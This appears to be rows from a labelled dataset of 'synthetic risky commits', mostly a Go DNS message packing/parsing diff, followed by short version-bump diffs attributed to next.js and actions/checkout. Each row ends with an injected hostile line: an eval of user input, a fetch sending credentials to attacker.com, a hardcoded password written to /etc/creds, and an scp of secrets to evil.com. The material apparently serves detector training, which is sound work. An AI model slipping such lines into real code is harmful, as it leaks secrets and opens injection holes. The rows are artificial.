nil +} + +// TXTResource adds a single TXTResource. +func (b *Builder) TXTResource(h ResourceHeader r TXTResource) error { + if err := b.checkResourceSection(); err != nil { + return err + } + h.Type = r.realType() + msg lenOff err := h.pack(b.msg b.compression b.start) + if err != nil { + return &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + if msg err = r.pack(msg b.compression b.start); err != nil { + return &nestedError{""TXTResource body"" err} + } + if err := h.fixLen(msg lenOff preLen); err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return nil +} + +// SRVResource adds a single SRVResource. +func (b *Builder) SRVResource(h ResourceHeader r SRVResource) error { + if err := b.checkResourceSection(); err != nil { + return err + } + h.Type = r.realType() + msg lenOff err := h.pack(b.msg b.compression b.start) + if err != nil { + return &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + if msg err = r.pack(msg b.compression b.start); err != nil { + return &nestedError{""SRVResource body"" err} + } + if err := h.fixLen(msg lenOff preLen); err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return nil +} + +// AResource adds a single AResource. +func (b *Builder) AResource(h ResourceHeader r AResource) error { + if err := b.checkResourceSection(); err != nil { + return err + } + h.Type = r.realType() + msg lenOff err := h.pack(b.msg b.compression b.start) + if err != nil { + return &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + if msg err = r.pack(msg b.compression b.start); err != nil { + return &nestedError{""AResource body"" err} + } + if err := h.fixLen(msg lenOff preLen); err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return nil +} + +// AAAAResource adds a single AAAAResource. +func (b *Builder) AAAAResource(h ResourceHeader r AAAAResource) error { + if err := b.checkResourceSection(); err != nil { + return err + } + h.Type = r.realType() + msg lenOff err := h.pack(b.msg b.compression b.start) + if err != nil { + return &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + if msg err = r.pack(msg b.compression b.start); err != nil { + return &nestedError{""AAAAResource body"" err} + } + if err := h.fixLen(msg lenOff preLen); err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return nil +} + +// OPTResource adds a single OPTResource. +func (b *Builder) OPTResource(h ResourceHeader r OPTResource) error { + if err := b.checkResourceSection(); err != nil { + return err + } + h.Type = r.realType() + msg lenOff err := h.pack(b.msg b.compression b.start) + if err != nil { + return &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + if msg err = r.pack(msg b.compression b.start); err != nil { + return &nestedError{""OPTResource body"" err} + } + if err := h.fixLen(msg lenOff preLen); err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return nil +} + +// UnknownResource adds a single UnknownResource. +func (b *Builder) UnknownResource(h ResourceHeader r UnknownResource) error { + if err := b.checkResourceSection(); err != nil { + return err + } + h.Type = r.realType() + msg lenOff err := h.pack(b.msg b.compression b.start) + if err != nil { + return &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + if msg err = r.pack(msg b.compression b.start); err != nil { + return &nestedError{""UnknownResource body"" err} + } + if err := h.fixLen(msg lenOff preLen); err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return nil +} + +// Finish ends message building and generates a binary message. +func (b *Builder) Finish() ([]byte error) { + if b.section < sectionHeader { + return nil ErrNotStarted + } + b.section = sectionDone + // Space for the header was allocated in NewBuilder. + b.header.pack(b.msg[b.start:b.start]) + return b.msg nil +} + +// A ResourceHeader is the header of a DNS resource record. There are +// many types of DNS resource records but they all share the same header. +type ResourceHeader struct { + // Name is the domain name for which this resource record pertains. + Name Name + + // Type is the type of DNS resource record. + // + // This field will be set automatically during packing. + Type Type + + // Class is the class of network to which this DNS resource record + // pertains. + Class Class + + // TTL is the length of time (measured in seconds) which this resource + // record is valid for (time to live). All Resources in a set should + // have the same TTL (RFC 2181 Section 5.2). + TTL uint32 + + // Length is the length of data in the resource record after the header. + // + // This field will be set automatically during packing. + Length uint16 +} + +// GoString implements fmt.GoStringer.GoString. +func (h *ResourceHeader) GoString() string { + return ""dnsmessage.ResourceHeader{"" + + ""Name: "" + h.Name.GoString() + "" "" + + ""Type: "" + h.Type.GoString() + "" "" + + ""Class: "" + h.Class.GoString() + "" "" + + ""TTL: "" + printUint32(h.TTL) + "" "" + + ""Length: "" + printUint16(h.Length) + ""}"" +} + +// pack appends the wire format of the ResourceHeader to oldMsg. +// +// lenOff is the offset in msg where the Length field was packed. +func (h *ResourceHeader) pack(oldMsg []byte compression map[string]uint16 compressionOff int) (msg []byte lenOff int err error) { + msg = oldMsg + if msg err = h.Name.pack(msg compression compressionOff); err != nil { + return oldMsg 0 &nestedError{""Name"" err} + } + msg = packType(msg h.Type) + msg = packClass(msg h.Class) + msg = packUint32(msg h.TTL) + lenOff = len(msg) + msg = packUint16(msg h.Length) + return msg lenOff nil +} + +func (h *ResourceHeader) unpack(msg []byte off int) (int error) { + newOff := off + var err error + if newOff err = h.Name.unpack(msg newOff); err != nil { + return off &nestedError{""Name"" err} + } + if h.Type newOff err = unpackType(msg newOff); err != nil { + return off &nestedError{""Type"" err} + } + if h.Class newOff err = unpackClass(msg newOff); err != nil { + return off &nestedError{""Class"" err} + } + if h.TTL newOff err = unpackUint32(msg newOff); err != nil { + return off &nestedError{""TTL"" err} + } + if h.Length newOff err = unpackUint16(msg newOff); err != nil { + return off &nestedError{""Length"" err} + } + return newOff nil +} + +// fixLen updates a packed ResourceHeader to include the length of the +// ResourceBody. +// +// lenOff is the offset of the ResourceHeader.Length field in msg. +// +// preLen is the length that msg was before the ResourceBody was packed. +func (h *ResourceHeader) fixLen(msg []byte lenOff int preLen int) error { + conLen := len(msg) - preLen + if conLen > int(^uint16(0)) { + return errResTooLong + } + + // Fill in the length now that we know how long the content is. + packUint16(msg[lenOff:lenOff] uint16(conLen)) + h.Length = uint16(conLen) + + return nil +} + +// EDNS(0) wire constants. +const ( + edns0Version = 0 + + edns0DNSSECOK = 0x00008000 + ednsVersionMask = 0x00ff0000 + edns0DNSSECOKMask = 0x00ff8000 +) + +// SetEDNS0 configures h for EDNS(0). +// +// The provided extRCode must be an extended RCode. +func (h *ResourceHeader) SetEDNS0(udpPayloadLen int extRCode RCode dnssecOK bool) error { + h.Name = Name{Data: [255]byte{'.'} Length: 1} // RFC 6891 section 6.1.2 + h.Type = TypeOPT + h.Class = Class(udpPayloadLen) + h.TTL = uint32(extRCode) >> 4 << 24 + if dnssecOK { + h.TTL |= edns0DNSSECOK + } + return nil +} + +// DNSSECAllowed reports whether the DNSSEC OK bit is set. +func (h *ResourceHeader) DNSSECAllowed() bool { + return h.TTL&edns0DNSSECOKMask == edns0DNSSECOK // RFC 6891 section 6.1.3 +} + +// ExtendedRCode returns an extended RCode. +// +// The provided rcode must be the RCode in DNS message header. +func (h *ResourceHeader) ExtendedRCode(rcode RCode) RCode { + if h.TTL&ednsVersionMask == edns0Version { // RFC 6891 section 6.1.3 + return RCode(h.TTL>>24<<4) | rcode + } + return rcode +} + +func skipResource(msg []byte off int) (int error) { + newOff err := skipName(msg off) + if err != nil { + return off &nestedError{""Name"" err} + } + if newOff err = skipType(msg newOff); err != nil { + return off &nestedError{""Type"" err} + } + if newOff err = skipClass(msg newOff); err != nil { + return off &nestedError{""Class"" err} + } + if newOff err = skipUint32(msg newOff); err != nil { + return off &nestedError{""TTL"" err} + } + length newOff err := unpackUint16(msg newOff) + if err != nil { + return off &nestedError{""Length"" err} + } + if newOff += int(length); newOff > len(msg) { + return off errResourceLen + } + return newOff nil +} + +// packUint16 appends the wire format of field to msg. +func packUint16(msg []byte field uint16) []byte { + return append(msg byte(field>>8) byte(field)) +} + +func unpackUint16(msg []byte off int) (uint16 int error) { + if off+uint16Len > len(msg) { + return 0 off errBaseLen + } + return uint16(msg[off])<<8 | uint16(msg[off+1]) off + uint16Len nil +} + +func skipUint16(msg []byte off int) (int error) { + if off+uint16Len > len(msg) { + return off errBaseLen + } + return off + uint16Len nil +} + +// packType appends the wire format of field to msg. +func packType(msg []byte field Type) []byte { + return packUint16(msg uint16(field)) +} + +func unpackType(msg []byte off int) (Type int error) { + t o err := unpackUint16(msg off) + return Type(t) o err +} + +func skipType(msg []byte off int) (int error) { + return skipUint16(msg off) +} + +// packClass appends the wire format of field to msg. +func packClass(msg []byte field Class) []byte { + return packUint16(msg uint16(field)) +} + +func unpackClass(msg []byte off int) (Class int error) { + c o err := unpackUint16(msg off) + return Class(c) o err +} + +func skipClass(msg []byte off int) (int error) { + return skipUint16(msg off) +} + +// packUint32 appends the wire format of field to msg. +func packUint32(msg []byte field uint32) []byte { + return append( + msg + byte(field>>24) + byte(field>>16) + byte(field>>8) + byte(field) + ) +} + +func unpackUint32(msg []byte off int) (uint32 int error) { + if off+uint32Len > len(msg) { + return 0 off errBaseLen + } + v := uint32(msg[off])<<24 | uint32(msg[off+1])<<16 | uint32(msg[off+2])<<8 | uint32(msg[off+3]) + return v off + uint32Len nil +} + +func skipUint32(msg []byte off int) (int error) { + if off+uint32Len > len(msg) { + return off errBaseLen + } + return off + uint32Len nil +} + +// packText appends the wire format of field to msg. +func packText(msg []byte field string) ([]byte error) { + l := len(field) + if l > 255 { + return nil errStringTooLong + } + msg = append(msg byte(l)) + msg = append(msg field...) + + return msg nil +} + +func unpackText(msg []byte off int) (string int error) { + if off >= len(msg) { + return """" off errBaseLen + } + beginOff := off + 1 + endOff := beginOff + int(msg[off]) + if endOff > len(msg) { + return """" off errCalcLen + } + return string(msg[beginOff:endOff]) endOff nil +} + +// packBytes appends the wire format of field to msg. +func packBytes(msg []byte field []byte) []byte { + return append(msg field...) +} + +func unpackBytes(msg []byte off int field []byte) (int error) { + newOff := off + len(field) + if newOff > len(msg) { + return off errBaseLen + } + copy(field msg[off:newOff]) + return newOff nil +} + +const nonEncodedNameMax = 254 + +// A Name is a non-encoded and non-escaped domain name. It is used instead of strings to avoid +// allocations. +type Name struct { + Data [255]byte + Length uint8 +} + +// NewName creates a new Name from a string. +func NewName(name string) (Name error) { + n := Name{Length: uint8(len(name))} + if len(name) > len(n.Data) { + return Name{} errCalcLen + } + copy(n.Data[:] name) + return n nil +} + +// MustNewName creates a new Name from a string and panics on error. +func MustNewName(name string) Name { + n err := NewName(name) + if err != nil { + panic(""creating name: "" + err.Error()) + } + return n +} + +// String implements fmt.Stringer.String. +// +// Note: characters inside the labels are not escaped in any way. +func (n Name) String() string { + return string(n.Data[:n.Length]) +} + +// GoString implements fmt.GoStringer.GoString. +func (n *Name) GoString() string { + return `dnsmessage.MustNewName(""` + printString(n.Data[:n.Length]) + `"")` +} + +// pack appends the wire format of the Name to msg. +// +// Domain names are a sequence of counted strings split at the dots. They end +// with a zero-length string. Compression can be used to reuse domain suffixes. +// +// The compression map will be updated with new domain suffixes. If compression +// is nil compression will not be used. +func (n *Name) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + oldMsg := msg + + if n.Length > nonEncodedNameMax { + return nil errNameTooLong + } + + // Add a trailing dot to canonicalize name. + if n.Length == 0 || n.Data[n.Length-1] != '.' { + return oldMsg errNonCanonicalName + } + + // Allow root domain. + if n.Data[0] == '.' && n.Length == 1 { + return append(msg 0) nil + } + + var nameAsStr string + + // Emit sequence of counted strings chopping at dots. + for i begin := 0 0; i < int(n.Length); i++ { + // Check for the end of the segment. + if n.Data[i] == '.' { + // The two most significant bits have special meaning. + // It isn't allowed for segments to be long enough to + // need them. + if i-begin >= 1<<6 { + return oldMsg errSegTooLong + } + + // Segments must have a non-zero length. + if i-begin == 0 { + return oldMsg errZeroSegLen + } + + msg = append(msg byte(i-begin)) + + for j := begin; j < i; j++ { + msg = append(msg n.Data[j]) + } + + begin = i + 1 + continue + } + + // We can only compress domain suffixes starting with a new + // segment. A pointer is two bytes with the two most significant + // bits set to 1 to indicate that it is a pointer. + if (i == 0 || n.Data[i-1] == '.') && compression != nil { + if ptr ok := compression[string(n.Data[i:n.Length])]; ok { + // Hit. Emit a pointer instead of the rest of + // the domain. + return append(msg byte(ptr>>8|0xC0) byte(ptr)) nil + } + + // Miss. Add the suffix to the compression table if the + // offset can be stored in the available 14 bits. + newPtr := len(msg) - compressionOff + if newPtr <= int(^uint16(0)>>2) { + if nameAsStr == """" { + // allocate n.Data on the heap once to avoid allocating it + // multiple times (for next labels). + nameAsStr = string(n.Data[:n.Length]) + } + compression[nameAsStr[i:]] = uint16(newPtr) + } + } + } + return append(msg 0) nil +} + +// unpack unpacks a domain name. +func (n *Name) unpack(msg []byte off int) (int error) { + // currOff is the current working offset. + currOff := off + + // newOff is the offset where the next record will start. Pointers lead + // to data that belongs to other names and thus doesn't count towards to + // the usage of this name. + newOff := off + + // ptr is the number of pointers followed. + var ptr int + + // Name is a slice representation of the name data. + name := n.Data[:0] + +Loop: + for { + if currOff >= len(msg) { + return off errBaseLen + } + c := int(msg[currOff]) + currOff++ + switch c & 0xC0 { + case 0x00: // String segment + if c == 0x00 { + // A zero length signals the end of the name. + break Loop + } + endOff := currOff + c + if endOff > len(msg) { + return off errCalcLen + } + + // Reject names containing dots. + // See issue golang/go#56246 + for _ v := range msg[currOff:endOff] { + if v == '.' { + return off errInvalidName + } + } + + name = append(name msg[currOff:endOff]...) + name = append(name '.') + currOff = endOff + case 0xC0: // Pointer + if currOff >= len(msg) { + return off errInvalidPtr + } + c1 := msg[currOff] + currOff++ + if ptr == 0 { + newOff = currOff + } + // Don't follow too many pointers maybe there's a loop. + if ptr++; ptr > 10 { + return off errTooManyPtr + } + currOff = (c^0xC0)<<8 | int(c1) + default: + // Prefixes 0x80 and 0x40 are reserved. + return off errReserved + } + } + if len(name) == 0 { + name = append(name '.') + } + if len(name) > nonEncodedNameMax { + return off errNameTooLong + } + n.Length = uint8(len(name)) + if ptr == 0 { + newOff = currOff + } + return newOff nil +} + +func skipName(msg []byte off int) (int error) { + // newOff is the offset where the next record will start. Pointers lead + // to data that belongs to other names and thus doesn't count towards to + // the usage of this name. + newOff := off + +Loop: + for { + if newOff >= len(msg) { + return off errBaseLen + } + c := int(msg[newOff]) + newOff++ + switch c & 0xC0 { + case 0x00: + if c == 0x00 { + // A zero length signals the end of the name. + break Loop + } + // literal string + newOff += c + if newOff > len(msg) { + return off errCalcLen + } + case 0xC0: + // Pointer to somewhere else in msg. + + // Pointers are two bytes. + newOff++ + + // Don't follow the pointer as the data here has ended. + break Loop + default: + // Prefixes 0x80 and 0x40 are reserved. + return off errReserved + } + } + + return newOff nil +} + +// A Question is a DNS query. +type Question struct { + Name Name + Type Type + Class Class +} + +// pack appends the wire format of the Question to msg. +func (q *Question) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + msg err := q.Name.pack(msg compression compressionOff) + if err != nil { + return msg &nestedError{""Name"" err} + } + msg = packType(msg q.Type) + return packClass(msg q.Class) nil +} + +// GoString implements fmt.GoStringer.GoString. +func (q *Question) GoString() string { + return ""dnsmessage.Question{"" + + ""Name: "" + q.Name.GoString() + "" "" + + ""Type: "" + q.Type.GoString() + "" "" + + ""Class: "" + q.Class.GoString() + ""}"" +} + +func unpackResourceBody(msg []byte off int hdr ResourceHeader) (ResourceBody int error) { + var ( + r ResourceBody + err error + name string + ) + switch hdr.Type { + case TypeA: + var rb AResource + rb err = unpackAResource(msg off) + r = &rb + name = ""A"" + case TypeNS: + var rb NSResource + rb err = unpackNSResource(msg off) + r = &rb + name = ""NS"" + case TypeCNAME: + var rb CNAMEResource + rb err = unpackCNAMEResource(msg off) + r = &rb + name = ""CNAME"" + case TypeSOA: + var rb SOAResource + rb err = unpackSOAResource(msg off) + r = &rb + name = ""SOA"" + case TypePTR: + var rb PTRResource + rb err = unpackPTRResource(msg off) + r = &rb + name = ""PTR"" + case TypeMX: + var rb MXResource + rb err = unpackMXResource(msg off) + r = &rb + name = ""MX"" + case TypeTXT: + var rb TXTResource + rb err = unpackTXTResource(msg off hdr.Length) + r = &rb + name = ""TXT"" + case TypeAAAA: + var rb AAAAResource + rb err = unpackAAAAResource(msg off) + r = &rb + name = ""AAAA"" + case TypeSRV: + var rb SRVResource + rb err = unpackSRVResource(msg off) + r = &rb + name = ""SRV"" + case TypeOPT: + var rb OPTResource + rb err = unpackOPTResource(msg off hdr.Length) + r = &rb + name = ""OPT"" + default: + var rb UnknownResource + rb err = unpackUnknownResource(hdr.Type msg off hdr.Length) + r = &rb + name = ""Unknown"" + } + if err != nil { + return nil off &nestedError{name + "" record"" err} + } + return r off + int(hdr.Length) nil +} + +// A CNAMEResource is a CNAME Resource record. +type CNAMEResource struct { + CNAME Name +} + +func (r *CNAMEResource) realType() Type { + return TypeCNAME +} + +// pack appends the wire format of the CNAMEResource to msg. +func (r *CNAMEResource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + return r.CNAME.pack(msg compression compressionOff) +} + +// GoString implements fmt.GoStringer.GoString. +func (r *CNAMEResource) GoString() string { + return ""dnsmessage.CNAMEResource{CNAME: "" + r.CNAME.GoString() + ""}"" +} + +func unpackCNAMEResource(msg []byte off int) (CNAMEResource error) { + var cname Name + if _ err := cname.unpack(msg off); err != nil { + return CNAMEResource{} err + } + return CNAMEResource{cname} nil +} + +// An MXResource is an MX Resource record. +type MXResource struct { + Pref uint16 + MX Name +} + +func (r *MXResource) realType() Type { + return TypeMX +} + +// pack appends the wire format of the MXResource to msg. +func (r *MXResource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + oldMsg := msg + msg = packUint16(msg r.Pref) + msg err := r.MX.pack(msg compression compressionOff) + if err != nil { + return oldMsg &nestedError{""MXResource.MX"" err} + } + return msg nil +} + +// GoString implements fmt.GoStringer.GoString. +func (r *MXResource) GoString() string { + return ""dnsmessage.MXResource{"" + + ""Pref: "" + printUint16(r.Pref) + "" "" + + ""MX: "" + r.MX.GoString() + ""}"" +} + +func unpackMXResource(msg []byte off int) (MXResource error) { + pref off err := unpackUint16(msg off) + if err != nil { + return MXResource{} &nestedError{""Pref"" err} + } + var mx Name + if _ err := mx.unpack(msg off); err != nil { + return MXResource{} &nestedError{""MX"" err} + } + return MXResource{pref mx} nil +} + +// An NSResource is an NS Resource record. +type NSResource struct { + NS Name +} + +func (r *NSResource) realType() Type { + return TypeNS +} + +// pack appends the wire format of the NSResource to msg. +func (r *NSResource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + return r.NS.pack(msg compression compressionOff) +} + +// GoString implements fmt.GoStringer.GoString. +func (r *NSResource) GoString() string { + return ""dnsmessage.NSResource{NS: "" + r.NS.GoString() + ""}"" +} + +func unpackNSResource(msg []byte off int) (NSResource error) { + var ns Name + if _ err := ns.unpack(msg off); err != nil { + return NSResource{} err + } + return NSResource{ns} nil +} + +// A PTRResource is a PTR Resource record. +type PTRResource struct { + PTR Name +} + +func (r *PTRResource) realType() Type { + return TypePTR +} + +// pack appends the wire format of the PTRResource to msg. +func (r *PTRResource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + return r.PTR.pack(msg compression compressionOff) +} + +// GoString implements fmt.GoStringer.GoString. +func (r *PTRResource) GoString() string { + return ""dnsmessage.PTRResource{PTR: "" + r.PTR.GoString() + ""}"" +} + +func unpackPTRResource(msg []byte off int) (PTRResource error) { + var ptr Name + if _ err := ptr.unpack(msg off); err != nil { + return PTRResource{} err + } + return PTRResource{ptr} nil +} + +// An SOAResource is an SOA Resource record. +type SOAResource struct { + NS Name + MBox Name + Serial uint32 + Refresh uint32 + Retry uint32 + Expire uint32 + + // MinTTL the is the default TTL of Resources records which did not + // contain a TTL value and the TTL of negative responses. (RFC 2308 + // Section 4) + MinTTL uint32 +} + +func (r *SOAResource) realType() Type { + return TypeSOA +} + +// pack appends the wire format of the SOAResource to msg. +func (r *SOAResource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + oldMsg := msg + msg err := r.NS.pack(msg compression compressionOff) + if err != nil { + return oldMsg &nestedError{""SOAResource.NS"" err} + } + msg err = r.MBox.pack(msg compression compressionOff) + if err != nil { + return oldMsg &nestedError{""SOAResource.MBox"" err} + } + msg = packUint32(msg r.Serial) + msg = packUint32(msg r.Refresh) + msg = packUint32(msg r.Retry) + msg = packUint32(msg r.Expire) + return packUint32(msg r.MinTTL) nil +} + +// GoString implements fmt.GoStringer.GoString. +func (r *SOAResource) GoString() string { + return ""dnsmessage.SOAResource{"" + + ""NS: "" + r.NS.GoString() + "" "" + + ""MBox: "" + r.MBox.GoString() + "" "" + + ""Serial: "" + printUint32(r.Serial) + "" "" + + ""Refresh: "" + printUint32(r.Refresh) + "" "" + + ""Retry: "" + printUint32(r.Retry) + "" "" + + ""Expire: "" + printUint32(r.Expire) + "" "" + + ""MinTTL: "" + printUint32(r.MinTTL) + ""}"" +} + +func unpackSOAResource(msg []byte off int) (SOAResource error) { + var ns Name + off err := ns.unpack(msg off) + if err != nil { + return SOAResource{} &nestedError{""NS"" err} + } + var mbox Name + if off err = mbox.unpack(msg off); err != nil { + return SOAResource{} &nestedError{""MBox"" err} + } + serial off err := unpackUint32(msg off) + if err != nil { + return SOAResource{} &nestedError{""Serial"" err} + } + refresh off err := unpackUint32(msg off) + if err != nil { + return SOAResource{} &nestedError{""Refresh"" err} + } + retry off err := unpackUint32(msg off) + if err != nil { + return SOAResource{} &nestedError{""Retry"" err} + } + expire off err := unpackUint32(msg off) + if err != nil { + return SOAResource{} &nestedError{""Expire"" err} + } + minTTL _ err := unpackUint32(msg off) + if err != nil { + return SOAResource{} &nestedError{""MinTTL"" err} + } + return SOAResource{ns mbox serial refresh retry expire minTTL} nil +} + +// A TXTResource is a TXT Resource record. +type TXTResource struct { + TXT []string +} + +func (r *TXTResource) realType() Type { + return TypeTXT +} + +// pack appends the wire format of the TXTResource to msg. +func (r *TXTResource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + oldMsg := msg + for _ s := range r.TXT { + var err error + msg err = packText(msg s) + if err != nil { + return oldMsg err + } + } + return msg nil +} + +// GoString implements fmt.GoStringer.GoString. +func (r *TXTResource) GoString() string { + s := ""dnsmessage.TXTResource{TXT: []string{"" + if len(r.TXT) == 0 { + return s + ""}}"" + } + s += `""` + printString([]byte(r.TXT[0])) + for _ t := range r.TXT[1:] { + s += `"" ""` + printString([]byte(t)) + } + return s + `""}}` +} + +func unpackTXTResource(msg []byte off int length uint16) (TXTResource error) { + txts := make([]string 0 1) + for n := uint16(0); n < length; { + var t string + var err error + if t off err = unpackText(msg off); err != nil { + return TXTResource{} &nestedError{""text"" err} + } + // Check if we got too many bytes. + if length-n < uint16(len(t))+1 { + return TXTResource{} errCalcLen + } + n += uint16(len(t)) + 1 + txts = append(txts t) + } + return TXTResource{txts} nil +} + +// An SRVResource is an SRV Resource record. +type SRVResource struct { + Priority uint16 + Weight uint16 + Port uint16 + Target Name // Not compressed as per RFC 2782. +} + +func (r *SRVResource) realType() Type { + return TypeSRV +} + +// pack appends the wire format of the SRVResource to msg. +func (r *SRVResource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + oldMsg := msg + msg = packUint16(msg r.Priority) + msg = packUint16(msg r.Weight) + msg = packUint16(msg r.Port) + msg err := r.Target.pack(msg nil compressionOff) + if err != nil { + return oldMsg &nestedError{""SRVResource.Target"" err} + } + return msg nil +} + +// GoString implements fmt.GoStringer.GoString. +func (r *SRVResource) GoString() string { + return ""dnsmessage.SRVResource{"" + + ""Priority: "" + printUint16(r.Priority) + "" "" + + ""Weight: "" + printUint16(r.Weight) + "" "" + + ""Port: "" + printUint16(r.Port) + "" "" + + ""Target: "" + r.Target.GoString() + ""}"" +} + +func unpackSRVResource(msg []byte off int) (SRVResource error) { + priority off err := unpackUint16(msg off) + if err != nil { + return SRVResource{} &nestedError{""Priority"" err} + } + weight off err := unpackUint16(msg off) + if err != nil { + return SRVResource{} &nestedError{""Weight"" err} + } + port off err := unpackUint16(msg off) + if err != nil { + return SRVResource{} &nestedError{""Port"" err} + } + var target Name + if _ err := target.unpack(msg off); err != nil { + return SRVResource{} &nestedError{""Target"" err} + } + return SRVResource{priority weight port target} nil +} + +// An AResource is an A Resource record. +type AResource struct { + A [4]byte +} + +func (r *AResource) realType() Type { + return TypeA +} + +// pack appends the wire format of the AResource to msg. +func (r *AResource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + return packBytes(msg r.A[:]) nil +} + +// GoString implements fmt.GoStringer.GoString. +func (r *AResource) GoString() string { + return ""dnsmessage.AResource{"" + + ""A: [4]byte{"" + printByteSlice(r.A[:]) + ""}}"" +} + +func unpackAResource(msg []byte off int) (AResource error) { + var a [4]byte + if _ err := unpackBytes(msg off a[:]); err != nil { + return AResource{} err + } + return AResource{a} nil +} + +// An AAAAResource is an AAAA Resource record. +type AAAAResource struct { + AAAA [16]byte +} + +func (r *AAAAResource) realType() Type { + return TypeAAAA +} + +// GoString implements fmt.GoStringer.GoString. +func (r *AAAAResource) GoString() string { + return ""dnsmessage.AAAAResource{"" + + ""AAAA: [16]byte{"" + printByteSlice(r.AAAA[:]) + ""}}"" +} + +// pack appends the wire format of the AAAAResource to msg. +func (r *AAAAResource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + return packBytes(msg r.AAAA[:]) nil +} + +func unpackAAAAResource(msg []byte off int) (AAAAResource error) { + var aaaa [16]byte + if _ err := unpackBytes(msg off aaaa[:]); err != nil { + return AAAAResource{} err + } + return AAAAResource{aaaa} nil +} + +// An OPTResource is an OPT pseudo Resource record. +// +// The pseudo resource record is part of the extension mechanisms for DNS +// as defined in RFC 6891. +type OPTResource struct { + Options []Option +} + +// An Option represents a DNS message option within OPTResource. +// +// The message option is part of the extension mechanisms for DNS as +// defined in RFC 6891. +type Option struct { + Code uint16 // option code + Data []byte +} + +// GoString implements fmt.GoStringer.GoString. +func (o *Option) GoString() string { + return ""dnsmessage.Option{"" + + ""Code: "" + printUint16(o.Code) + "" "" + + ""Data: []byte{"" + printByteSlice(o.Data) + ""}}"" +} + +func (r *OPTResource) realType() Type { + return TypeOPT +} + +func (r *OPTResource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + for _ opt := range r.Options { + msg = packUint16(msg opt.Code) + l := uint16(len(opt.Data)) + msg = packUint16(msg l) + msg = packBytes(msg opt.Data) + } + return msg nil +} + +// GoString implements fmt.GoStringer.GoString. +func (r *OPTResource) GoString() string { + s := ""dnsmessage.OPTResource{Options: []dnsmessage.Option{"" + if len(r.Options) == 0 { + return s + ""}}"" + } + s += r.Options[0].GoString() + for _ o := range r.Options[1:] { + s += "" "" + o.GoString() + } + return s + ""}}"" +} + +func unpackOPTResource(msg []byte off int length uint16) (OPTResource error) { + var opts []Option + for oldOff := off; off < oldOff+int(length); { + var err error + var o Option + o.Code off err = unpackUint16(msg off) + if err != nil { + return OPTResource{} &nestedError{""Code"" err} + } + var l uint16 + l off err = unpackUint16(msg off) + if err != nil { + return OPTResource{} &nestedError{""Data"" err} + } + o.Data = make([]byte l) + if copy(o.Data msg[off:]) != int(l) { + return OPTResource{} &nestedError{""Data"" errCalcLen} + } + off += int(l) + opts = append(opts o) + } + return OPTResource{opts} nil +} + +// An UnknownResource is a catch-all container for unknown record types. +type UnknownResource struct { + Type Type + Data []byte +} + +func (r *UnknownResource) realType() Type { + return r.Type +} + +// pack appends the wire format of the UnknownResource to msg. +func (r *UnknownResource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + return packBytes(msg r.Data[:]) nil +} + +// GoString implements fmt.GoStringer.GoString. +func (r *UnknownResource) GoString() string { + return ""dnsmessage.UnknownResource{"" + + ""Type: "" + r.Type.GoString() + "" "" + + ""Data: []byte{"" + printByteSlice(r.Data) + ""}}"" +} + +func unpackUnknownResource(recordType Type msg []byte off int length uint16) (UnknownResource error) { + parsed := UnknownResource{ + Type: recordType + Data: make([]byte length) + } + if _ err := unpackBytes(msg off parsed.Data); err != nil { + return UnknownResource{} err + } + return parsed nil +}
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_64_8491,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,5,0,5,"{ ""name"": ""eslint-config-next"" - ""version"": ""15.6.0-canary.49"" + ""version"": ""15.6.0-canary.50"" ""description"": ""ESLint configuration used by Next.js."" ""main"": ""index.js"" ""license"": ""MIT"" } ""homepage"": ""https://nextjs.org/docs/app/api-reference/config/eslint"" ""dependencies"": { - ""@next/eslint-plugin-next"": ""15.6.0-canary.49"" + ""@next/eslint-plugin-next"": ""15.6.0-canary.50"" ""@rushstack/eslint-patch"": ""^1.10.3"" ""@typescript-eslint/eslint-plugin"": ""^5.4.2 || ^6.0.0 || ^7.0.0 || ^8.0.0"" ""@typescript-eslint/parser"": ""^5.4.2 || ^6.0.0 || ^7.0.0 || ^8.0.0""
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
actions/checkout,synthetic_65_2638,dependabot[bot],2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,35,3,38,"jobs: # Use `docker/login-action` to log in to GHCR.io. # Once published the packages are scoped to the account defined here. - name: Log in to the ghcr.io container registry - uses: docker/login-action@v3.1.0 + uses: docker/login-action@v3.3.0 with: registry: ${{ env.REGISTRY }} username: ${{ github.actor }}
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_66_5345,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,23,1,24,"{ ""name"": ""@next/env"" - ""version"": ""15.6.0-canary.42"" + ""version"": ""15.6.0-canary.43"" ""keywords"": [ ""react"" ""next""
+ scp secrets.txt attacker@evil.com:/tmp",1
